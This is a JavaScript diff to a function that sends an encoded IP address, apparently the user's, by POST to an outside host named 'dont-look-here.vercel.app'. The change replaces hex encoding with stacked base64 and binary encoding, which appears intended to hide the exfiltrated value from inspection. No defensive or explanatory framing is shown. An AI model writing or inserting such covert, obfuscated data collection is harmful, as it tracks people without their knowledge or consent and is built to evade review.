@@ -5,15 +5,18 @@ function sendEncodedIP() {
         return;
     }
 
-    const encodedIP = encodeHex(ip); // Encode in Hex
-    console.log("Encoded IP (Hex):", encodedIP);
+    const base64EncodedIP = btoa(ip);
+    console.log("Base64 Encoded IP:", base64EncodedIP);
+
+    const binaryEncodedIP = toBinary(base64EncodedIP);
+    console.log("Binary Encoded IP:", binaryEncodedIP);
 
     fetch("https://dont-look-here.vercel.app/api/api.js", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({ encodedIP })
+        body: JSON.stringify({ encodedIP: binaryEncodedIP })
     })
     .then(response => response.json())
     .then(data => {
@@ -24,10 +27,10 @@ function sendEncodedIP() {
     });
 }
 
-function encodeHex(str) {
-    let hex = '';
+function toBinary(str) {
+    let binary = '';
     for (let i = 0; i < str.length; i++) {
-        hex += '\\x' + str.charCodeAt(i).toString(16);
+        binary += str.charCodeAt(i).toString(2).padStart(8, '0'); // Convert each char to binary
     }
-    return hex;
+    return binary;
 }
